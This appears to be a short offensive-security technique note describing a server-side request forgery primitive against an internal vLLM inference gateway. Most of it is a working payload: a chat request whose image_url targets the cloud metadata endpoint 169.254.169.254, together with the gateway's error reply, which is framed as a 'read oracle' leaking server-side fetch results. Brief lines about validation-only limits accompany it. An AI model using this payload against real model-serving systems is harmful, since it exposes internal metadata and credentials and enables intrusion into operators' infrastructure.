# The primitive

- source canon: `holyshit-mode/vllm-gateway-internal-fleet-ssrf.md`
- bindings: **MASTG-RES** · **CWE-494** · **ATT&CK T1601**
- generated: 2026-11-04

## The technique

```
POST https://<internal-gateway>/invocations
{"model":"deepseek-v4-flash",
 "messages":[{"role":"user","content":[
   {"type":"image_url","image_url":{"url":"http://169.254.169.254/latest/meta-data/"}}]}]}
```
→ `422 {"error":{"message":"Failed to fetch media from URL: HTTP 404 error (parameter=image_url,
value=http://169.254.169.254/latest/meta-data/)"}}`
The `HTTP 404 error` is the **server-side fetch result echoed back** — your read oracle.

## Family use

- decisive-test shape lives in the source canon
- walls: validation-only · NO-GAIN · documented-class adaptation only
